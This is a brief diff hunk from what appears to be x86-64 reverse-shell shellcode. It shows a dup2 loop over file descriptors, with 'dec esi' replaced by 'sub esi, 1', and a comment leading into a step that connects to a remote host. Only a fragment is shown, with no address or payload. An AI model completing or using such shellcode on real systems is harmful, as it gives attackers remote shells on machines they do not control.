@@ -75,7 +75,7 @@
 x64_dup2:
     mov     al, 33      ; rax=sys_dup2
     syscall
-    dec     esi
+    sub     esi, 1
     jns     x64_dup2    ; jump if not signed
     
     ; step 3, connect to remote host
